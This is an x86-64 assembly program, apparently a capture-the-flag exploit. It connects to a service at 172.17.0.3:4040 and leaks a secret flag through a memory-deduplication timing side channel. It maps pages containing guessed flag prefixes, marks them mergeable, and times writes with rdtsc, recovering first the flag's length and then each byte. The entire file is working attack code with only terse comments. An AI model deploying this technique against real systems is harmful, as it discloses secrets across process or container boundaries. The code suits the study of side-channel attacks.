[BITS 64]
global _start, create_page, strcpy

flag_len equ 0x18
sock equ 0x30
check_idx equ 0x40
; timing before and after
before equ 0x48
after equ 0x50
slow equ 0x58
idx equ 0x60
diff equ 0x68
test_page equ 0x70
copy equ 0x1800

send_buf equ 0x1500
found equ 0x1700
BUF_SIZE equ 0x1000

section .text

_start:
	push	rbp
	mov		rbp, rsp
	sub		rsp, 0x2000

	; mmap(0xbadcafe, 4096, 3, 34, -1, 0)
	push	0xbadcafe
	pop		rdi
	push	4096
	pop	rsi
	push	3
	pop	rdx
	push	34
	pop	r10
	push	-1
	pop	r8
	xor	r9, r9
	push	9
	pop	rax
	syscall

	; socket(family, type, protocol)
	push	2	; AF_INET
	pop		rdi
	push	1	; SOCK_STREAM
	pop		rsi
	xor		rdx, rdx ; IPPROTO_TCP
	push	41	; sys_socket
	pop		rax
	syscall

	mov		qword [rbp-sock], rax

	mov		rdi, rax
;	push	0x0100007f	; 127.0.0.1
	push	0x030011ac
	push	word 0xc80f ; 4040
	push	word 0x2
	push	rsp		; struct sockaddr *
	pop		rsi
	push	16		; size
	pop		rdx
	push	42
	pop		rax		; sys_connect
	syscall

	; find length of flag
	;mov		rdi, postfix
	push	0x7d		; }
	push	rsp
	pop		rdi
	call	create_page
	mov		qword [rbp-test_page], rax

	mov		qword [rbp-flag_len], 40
	mov		qword [rbp-slow], 0
flag_len_loop_start:
	; clear send buf
	lea		rdi, [rbp-send_buf]	; send buf
	mov		rdx, BUF_SIZE
	xor		rsi, rsi
	call	memset

	; pad the rest of buf with 'A'
	lea		rdi, [rbp-send_buf]
	mov		rdx, BUF_SIZE
	sub		rdx, qword [rbp-flag_len]	; sub flag_len
	mov		rsi, 0x41					; 'A'
	call	memset

	;ssize_t ret = write(sock, tmp, strlen(tmp));
	lea		rdi, [rbp-send_buf]
	call	strlen
	mov		rdx, rax				; count
	mov		rdi, qword [rbp-sock]	; fd
	lea		rsi, [rbp-send_buf]		; buf
	push	1
	pop		rax						; sys_write	
	syscall

	; sleep for a bit
	; nanosleep({tv_sec = 3, tv_nsec = 0}, NULL);
	xor		rsi, rsi
	push	rsi
	push	3
	push	rsp
	pop		rdi
	push	35						; sys_nanosleep
	pop		rax
	syscall

	; time access to the test page
	rdtsc
	shl		rdx, 32
	or		rax, rdx
	mov		qword [rbp-before], rax
	mov		rdi, [rbp-test_page]
	mov		byte [rdi], 0x41	; write to the page
	rdtsc
	shl		rdx, 32
	or		rax, rdx
	mov		qword [rbp-after], rax
	; compute diff in rsi
	mov		rdi, [rbp-before]
	mov		rsi, [rbp-after]
	sub		rsi, rdi

	; write back the }
	mov		rdi, [rbp-test_page]
	mov		byte [rdi], 0x7d	; write to the page

	cmp		qword [rbp-slow], 0
	jne		skip_slow_init
	mov		qword [rbp-slow], rsi
skip_slow_init:
	mov		rdi, rsi
	mov		rsi, qword [rbp-slow]
	shl		rsi, 3		; times 16 maybe times 8 instead?
	cmp		rdi, rsi
	jg		found_length

	inc		qword [rbp-flag_len]
flag_len_loop_end:
	cmp		qword [rbp-flag_len], 50
	jle		flag_len_loop_start

	; start probing for flag bytes
	; initialize some variables first
found_length:
	dec		qword [rbp-flag_len]

	; found array
	lea		rdi, [rbp-found]	; found
	mov		rdx, BUF_SIZE
	xor		rsi, rsi
	call	memset
	lea		rdi, [rbp-found] ; found
	mov		byte [rdi], 0x7d		; }

	jmp		flag_loop_end
flag_loop_start:
	; clear send buf
	lea		rdi, [rbp-send_buf]	; send buf
	mov		rdx, BUF_SIZE
	xor		rsi, rsi
	call	memset

	; pad the rest of buf with 'A'
	lea		rdi, [rbp-send_buf]
	mov		rdx, BUF_SIZE
	sub		rdx, qword [rbp-flag_len]	; sub flag_len
	mov		rsi, 0x41					; 'A'
	call	memset

	;create_test_pages(found);
	lea		rdi, [rbp-found]	; found
	call	create_test_pages

	;ssize_t ret = write(sock, tmp, strlen(tmp));
	lea		rdi, [rbp-send_buf]
	call	strlen
	mov		rdx, rax				; count
	mov		rdi, qword [rbp-sock]	; fd
	lea		rsi, [rbp-send_buf]		; buf
	push	1
	pop		rax						; sys_write	
	syscall

	; sleep 500 ms...
	; nanosleep({tv_sec = 0, tv_nsec = 250000000}, NULL);
	xor		rsi, rsi
	push	500000000 ; 250 ms
	push	rsi
	push	rsp
	pop		rdi
	push	35						; sys_nanosleep
	pop		rax
	syscall

	mov		qword [rbp-check_idx], 0
	mov		qword [rbp-slow], 0
	mov		qword [rbp-idx], 0
	jmp		check_loop_end
check_loop_start:
	rdtsc
	shl		rdx, 32
	or		rax, rdx
	mov		qword [rbp-before], rax

	mov		rcx, qword [rbp-check_idx]
	mov		rax, qword [rcx*8 + 0xbadcafe]
	mov		byte [rax], 0x41	; write to the page

	rdtsc
	shl		rdx, 32
	or		rax, rdx
	mov		qword [rbp-after], rax

	; compute diff in rsi
	mov		rdi, [rbp-before]
	mov		rsi, [rbp-after]
	sub		rsi, rdi

	cmp		rsi, qword [rbp-slow]
	jle		skip_slow
	; new slowest measure found
	mov		qword [rbp-slow], rsi
	mov		rcx, qword [rbp-check_idx]
	mov		qword [rbp-idx], rcx
skip_slow:
	inc		qword [rbp-check_idx]	
check_loop_end:
	cmp		qword [rbp-check_idx], 93
	jl		check_loop_start

	; reset slow measure
	mov		qword [rbp-slow], 0
	lea		rdi, [rbp-copy]
	mov		rdx, 0x100
	xor		rsi, rsi
	call	memset

	lea		rdi, [rbp-copy]
	lea		rsi, [rbp-found]
	call	strcpy

	lea		rdi, [rbp-found]
	mov		rdx, 0x100
	xor		rsi, rsi
	call	memset

	; find character
	mov		rax, qword [rbp-idx]
	add		rax, 0x21
	lea		rdi, [rbp-found]
	mov		byte [rdi], al

	; debug print
	or		rax, 0x0a00		; add newline to found character
	push	rax
	push	rsp
	pop		rsi		; buf
	push	1
	pop		rax		; sys_write
	push	1
	pop		rdi		; fd (stdout)
	push	2
	pop		rdx		; count
	syscall

	lea		rdi, [rbp-found]
	lea		rsi, [rbp-copy]
	call	strcat

	lea		rdi, [rbp-found]
	call	puts
	call	cleanup_test_pages

	dec		qword [rbp-flag_len]
flag_loop_end:
	cmp		qword [rbp-flag_len], 0x4
	ja		flag_loop_start

out:
	mov		rdi, [rbp-sock]
	push	3
	pop		rax			; sys_close
	syscall

	push	0x00
	pop	rdi
	push	60
	pop	rax
	syscall

create_test_pages:
	push	rbp
	mov	rbp, rsp
	sub	rsp, 132

	mov	rbx, rdi

	lea	rdi, [rbp - 128]
	xor	rsi, rsi
	push	40
	pop	rdx
	call	memset

	lea	rdi, [rbp - 128]
	inc	rdi
	mov	rsi, rbx
	call	strcpy

	mov	rcx, 0x21
create_loop:
	lea	rdi, [rbp - 128]
	mov	byte [rdi], cl

	mov	rbx, rcx
	sub	rbx, 0x21

	push	rbx
	push	rcx
	call	create_page
	pop	rcx
	pop	rbx

	mov	qword [rbx*8 + 0xbadcafe], rax

	inc	cl
	cmp	cl, 0x7e
	jle	create_loop
	
	add	rsp, 132
	leave
	ret

cleanup_test_pages:
	push	rbp
	mov		rbp, rsp
	xor		rcx, rcx

cleanup_loop:
	push	rcx
	mov		rdi, qword [rcx*8 + 0xbadcafe]
	mov		rsi, 0x1000
	push	11
	pop		rax			; sys_munmap
	syscall

	pop		rcx
	inc		rcx
	cmp		rcx, 0x93
	jl		cleanup_loop

	leave
	ret

strcpy:
	push   rbp
	mov    rbp,rsp
	mov    qword [rbp-0x18],rdi
	mov    qword [rbp-0x20],rsi
	mov    rax,qword [rbp-0x18]
	mov    qword [rbp-0x8],rax
	nop
strcpy_loop:
	mov    rax,qword [rbp-0x18]
	lea    rdx,[rax+0x1]
	mov    qword [rbp-0x18],rdx
	mov    rdx,qword [rbp-0x20]
	lea    rcx,[rdx+0x1]
	mov    qword [rbp-0x20],rcx
	movzx  edx,byte [rdx]
	mov    byte [rax],dl
	movzx  eax,byte [rax]
	test   al,al
	jne    strcpy_loop
	mov    rax,qword [rbp-0x8]
	pop    rbp
	ret

puts:
	push	rbp
	mov		rbp, rsp
	sub		rsp, 0x100

	mov		qword [rbp-0x10], rdi
	mov		qword [rbp-0x18], 0x00	; len

	call	strlen
	mov		qword [rbp-0x18], rax

	mov		rsi, qword [rbp-0x10]
	mov		rdx, rax
	push	1
	pop		rdi
	push	1
	pop		rax
	syscall

	push	0xa
	pop		rax
	push	rax
	push	rsp
	pop		rsi
	push	1
	push	1
	push	1
	pop		rdx
	pop		rdi
	pop		rax
	syscall

	add		rsp, 0x100
	leave
	ret

memset:
	push   rbp
	mov    rbp,rsp

	mov    qword [rbp-0x18],rdi
	mov    dword [rbp-0x1c],esi
	mov    qword [rbp-0x28],rdx
	mov    rax,qword [rbp-0x18]
	mov    qword [rbp-0x8],rax
	jmp    memset_over
memset_loop:
	mov    rax,qword [rbp-0x8]
	lea    rdx,[rax+0x1]
	mov    qword [rbp-0x8],rdx
	mov    edx,dword [rbp-0x1c]
	mov    byte [rax],dl
memset_over:
	mov    rax,qword [rbp-0x28]
	lea    rdx,[rax-0x1]
	mov    qword [rbp-0x28],rdx
	test   rax,rax
	jne    memset_loop
	mov    rax,qword [rbp-0x18]
	pop    rbp
	ret

strlen:
	push   rbp
	mov    rbp,rsp
	mov    qword [rbp-0x18],rdi
	mov    rax,qword [rbp-0x18]
	mov    qword [rbp-0x8],rax
	jmp    strlen_over
strlen_loop:
	add    qword [rbp-0x8],0x1
strlen_over:
	mov    rax,qword [rbp-0x8]
	movzx  eax,byte [rax]
	test   al,al
	jne    strlen_loop
	mov    rdx,qword [rbp-0x8]
	mov    rax,qword [rbp-0x18]
	sub    rdx,rax
	mov    rax,rdx
	pop    rbp
	ret

strcat:
	push   rbp
	mov    rbp,rsp
	mov    qword [rbp-0x18],rdi
	mov    qword [rbp-0x20],rsi
	mov    rax,qword [rbp-0x18]
	mov    qword [rbp-0x8],rax
	jmp    strcat_over
strcat_loop:
	add    qword [rbp-0x18],0x1
strcat_over:
	mov    rax,qword [rbp-0x18]
	movzx  eax,byte [rax]
	test   al,al
	jne    strcat_loop
	nop
strcat_loop2:
	mov    rax,qword [rbp-0x18]
	lea    rdx,[rax+0x1]
	mov    qword [rbp-0x18],rdx
	mov    rdx,qword [rbp-0x20]
	lea    rcx,[rdx+0x1]
	mov    qword [rbp-0x20],rcx
	movzx  edx,byte [rdx]
	mov    byte [rax],dl
	movzx  eax,byte [rax]
	test   al,al
	jne    strcat_loop2
	mov    rax,qword [rbp-0x8]
	pop    rbp
	ret

; rdi, rsi, rdx, r10, r8, r9
; static char *create_page(const char *msg)
create_page:
	push	rbp
	mov	rbp, rsp

	; save msg
	mov	rbx, rdi

	; mmap(NULL, 4096, 3, 34, -1, 0)
	xor	rdi, rdi	
	push	4096
	pop	rsi
	push	3
	pop	rdx
	push	34
	pop	r10
	push	-1
	pop	r8
	xor	r9, r9
	push	9
	pop	rax
	syscall

	push	rax
	; madvise
	mov	rdi, rax
	push	4096
	pop	rsi
	push	12
	pop	rdx
	push	28
	pop	rax
	syscall

	; restore page
	pop	rax
	mov	rdi, rax
	mov	rsi, rbx ; msg
	mov	rbx, rax
	call	strcpy

	mov	rax, rbx
	leave
	ret
